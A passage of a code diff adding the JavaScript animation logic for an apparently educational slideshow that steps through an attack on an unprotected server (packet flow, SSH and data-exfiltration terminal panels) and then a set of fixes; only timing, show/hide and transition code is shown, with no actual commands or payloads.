+    d.setAttribute('cx', x1); d.setAttribute('cy', y1); d.setAttribute('opacity','1');
+    const frames = Math.max(1, Math.round(durMs / 16)); let f = 0;
+    function step() {
+      f++; const p = Math.min(f / frames, 1);
+      d.setAttribute('cx', x1 + (x2 - x1) * p);
+      d.setAttribute('cy', y1 + (y2 - y1) * p);
+      if (f < frames) af(16, step); else d.setAttribute('opacity','0');
+    }
+    af(16, step);
+  });
+}
+
+function go(n) {
+  clr();
+  const prev = document.getElementById('s' + cur);
+  const next = document.getElementById('s' + n);
+  const fwd = n > cur;
+  next.style.transition = 'none';
+  next.style.transform = fwd ? 'translateX(100%)' : 'translateX(-100%)';
+  next.offsetHeight;
+  next.style.transition = 'transform .35s cubic-bezier(.4,0,.2,1)';
+  prev.style.transition = 'transform .35s cubic-bezier(.4,0,.2,1)';
+  prev.style.transform = fwd ? 'translateX(-100%)' : 'translateX(100%)';
+  next.style.transform = 'translateX(0)';
+  prev.classList.remove('active');
+  next.classList.add('active');
+  cur = n;
+  reset(n);
+  af(80, () => play(n));
+}
+
+function reset(n) {
+  if (n === 1) {
+    ['cloud','ct1','ct2','atk','atk2','atk3','wire1','wire2','wire3','nfw','nfw2','nfw3',
+     'srv','srv2','srv3','srv4','pbadge','pbadge2','pkt1','rootbadge','rootbadge2','oslabel'].forEach(id => svgHide(id));
+    hide('whatbox'); hide('dangbox');
+  }
+  if (n === 2) {
+    hide('step1box'); hide('step2box'); hide('step3box'); hide('fwdiag');
+    ['s2l1','s2l2','s2l3','s2l4','s2l5','s2l6','s2l7','s2l8',
+     's2l9','s2l10','s2l11','s2l12','s2l13'].forEach(id => hideEl(id));
+  }
+  if (n === 3) {
+    hide('sshterm'); hide('dataterm'); hide('impactrow');
+    ['s3l1','s3l2','s3l3','s3l4','s3l5','s3l6','s3l7',
+     's3l8','s3l9','s3l10','s3l11','s3l12','s3l13','s3cursor'].forEach(id => hideEl(id));
+  }
+  if (n === 4) {
+    hide('fix1'); hide('fix2'); hide('fix3'); hide('fix4'); hide('sumbox');
+    ['bar1','bar2','bar3','bar4'].forEach(id => {
+      const e = document.getElementById(id);
+      if (e) { e.style.transition='none'; e.style.width='0px'; }
+    });
+    ['bar1pct','bar2pct','bar3pct','bar4pct'].forEach(id => svgHide(id));
+  }
+}
+
+function play(n) {
+  clr();
+  if (n === 1) {
+    // Internet cloud
+    svgShow('cloud', 200); svgShow('ct1', 250); svgShow('ct2', 300);
+    // Wires
+    svgShow('wire2', 500); svgShow('wire3', 550);
+    // No firewall
+    svgShow('nfw', 700); svgShow('nfw2', 750); svgShow('nfw3', 800);
+    // Server
+    svgShow('srv', 900); svgShow('srv2', 950); svgShow('srv3', 1000);
+    svgShow('srv4', 1050);
+    svgShow('pbadge', 1100); svgShow('pbadge2', 1150);
+    svgShow('rootbadge', 1200); svgShow('rootbadge2', 1250);
+    svgShow('oslabel', 1300);
+    // Attacker
+    svgShow('atk', 1400); svgShow('atk2', 1450); svgShow('atk3', 1500);
+    svgShow('wire1', 1550);
+    // Packet animations — attacker to cloud to server
+    movePkt('pkt1', 64, 118, 90, 90, 1700, 400);
+    movePkt('pkt1', 110, 87, 270, 87, 2200, 500);
+    movePkt('pkt1', 64, 118, 90, 90, 3000, 400);
+    movePkt('pkt1', 110, 87, 270, 87, 3500, 500);
+    // Info panels
+    show('whatbox', 2000);
+    show('dangbox', 2700);
+  }
+
+  if (n === 2) {
+    // Step 1
+    show('step1box', 200);
+    showEl('s2l1', 600); showEl('s2l2', 900); showEl('s2l3', 1200);
+    // Step 2
+    show('step2box', 1500);
+    showEl('s2l4', 1800); showEl('s2l5', 2100);
+    showEl('s2l6', 2300); showEl('s2l7', 2600);
+    showEl('s2l8', 2900);
+    // Step 3
+    show('step3box', 3200);
+    showEl('s2l9', 3500); showEl('s2l10', 3800);
+    showEl('s2l11', 4000); showEl('s2l12', 4300);
+    showEl('s2l13', 4600);
+    // File diagram
+    show('fwdiag', 5000);
+  }
+
+  if (n === 3) {
+    show('sshterm', 200);
+    showEl('s3l1', 600); showEl('s3l2', 900);
+    showEl('s3l3', 1200); showEl('s3cursor', 1200);
+    // Blinking cursor
+    af(1200, () => {
+      let blink = true;
+      function blinkFn() {
+        const c = document.getElementById('s3cursor');
+        if (c) { c.style.opacity = blink ? '1' : '0'; blink = !blink; }
+        af(400, blinkFn);
+      }
+      blinkFn();
+    });
+    showEl('s3l4', 2200); showEl('s3l5', 2700);
+    showEl('s3l6', 3200); showEl('s3l7', 3700);
+    // Data exfil
+    show('dataterm', 4200);
+    showEl('s3l8', 4600); showEl('s3l9', 4900);
+    showEl('s3l10', 5200); showEl('s3l11', 5500);
+    showEl('s3l12', 5800); showEl('s3l13', 6300);
+    // Impact
+    show('impactrow', 6800);
+  }
+
+  if (n === 4) {
+    show('fix1', 200);
+    show('fix2', 900);
+    show('fix3', 1600);
+    show('fix4', 2300);
+    show('sumbox', 3000);
+    // Bars
+    animBar('bar1', 'bar1pct', 100, '#4eff9a', 3300);
+    animBar('bar2', 'bar2pct', 145, '#4ec9e1', 3500);
+    animBar('bar3', 'bar3pct', 118, '#a080ff', 3700);
+    animBar('bar4', 'bar4pct', 162, '#e8a020', 3900);
+  }
+}
+
+window.addEventListener('load', () => { af(150, () => play(1)); });
+</script>
+</body>
+</html>
